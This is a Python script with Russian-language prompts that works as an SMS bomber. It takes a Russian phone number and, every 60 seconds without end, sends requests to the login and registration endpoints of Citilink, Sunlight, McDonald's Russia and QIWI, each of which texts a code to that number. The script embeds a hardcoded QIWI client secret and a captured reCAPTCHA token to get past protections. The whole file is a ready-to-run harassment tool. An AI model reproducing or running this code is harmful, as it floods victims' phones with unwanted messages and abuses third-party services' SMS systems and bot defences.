import requests, time
import colorama

colorama.init()

GREEN 	= colorama.Fore.GREEN
RED		= colorama.Fore.RED
WHITE 	= colorama.Fore.WHITE
YELLOW	= colorama.Fore.YELLOW
HEADERS = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Mobile Safari/537.36",
	"Accept": "*/*",
	"Accept-Encoding": "gzip, deflate, br",
	"Connection": "keep-alive"
}

print('Автор скрипта не несет ответственности. Использовать на свой страх и риск.')
CHOOSE = input("Согласен? (y/n) > ")
if CHOOSE == 'y':
	pass
elif CHOOSE == 'n':
	exit()
else:
	print("Введено неправильное значение.")
	exit()

while True:
	phone = input("Введи номер телефона (без +) >> ")
	if phone.startswith("+"):
		print("Введите номер БЕЗ +")
	elif phone.startswith("7") and len(phone) == 11:
		# print(phone[1:4])
		# print(phone[4:7])
		# print(phone[7:9])
		# print(phone[9:11])
		break
	else:
		print("Некорректный номер!")

print("\nЧтобы остановить скрипт нажми CTRL+C или CTRL+Z.")

def status(response, service_name):
	if response.status_code == 200:
		print(f"{GREEN}[{service_name}] {YELLOW}сообщение отправлено!{WHITE}")
	else:
		print(f"{RED}[{service_name}] сообщение не отправлено, код: {response.status_code}{WHITE}")

while True:
	session = requests.session()
	try:
		r = session.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
		status(r, "citilink")
	except:
		pass

	try:
		r = session.post("https://api.sunlight.net/v3/customers/authorization/", data = {
			phone: phone
		})
		status(r, "sunlight")
	except:
		pass

	try:
		r = session.post(
			"https://site-api.mcdonalds.ru/api/v1/user/login/phone",
			data 	= {
				"g-recaptcha-response": "03AGdBq27LudFcCp1lOjlK42p1FDwylWME-V1Ps65tPIDhrEbT6z9wx4zH4WhXAKdPtYcpJQW059M17-vU1is0ulGi49n-NGkuyb2HD1GNKroE_2HeIotrf80rO4-QvBWrMP6asUXgiAe4qAVqs2hzd8Fj1K2jq73Ga1TCeiVIpGL9kDpDyF4thwoHI2WcIm7eDRZcivsgGZWff53lQOdUp8lpfHnlemhwJiygcmv2drhaGjj7g4nnuxLtdOUDcGtKaQIrK66RsnjteBCyNCdya6iTVebWfDizAyyFML8mTF-aG8VINEPuwEuBvXX7daggIht-BoUw1u-7c_G0DA5D5B4w6xpbo95eDo3pOjON4nfgEJcTC3TnvG7AFQq0dEKrS2vlnjrkwUx1YFAc6Hdg-XxAuG0T-inCdIniuAWS162F8gS8JWXrzNwhzV9zjXEhBXGo_87edYjv",
				"phone": f"+{phone}"
			}
		)
		status(r, "mcdonalds")
	except:
		pass

	try:
		r = session.post("https://mobile-api.qiwi.com/oauth/authorize", data = {'response_type':
																					'urn:qiwi:oauth:response-type:confirmation-id', 'username': f"+{phone}", 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'})
		status(r, "qiwi")

	except:
		pass


	time.sleep(60)
















































































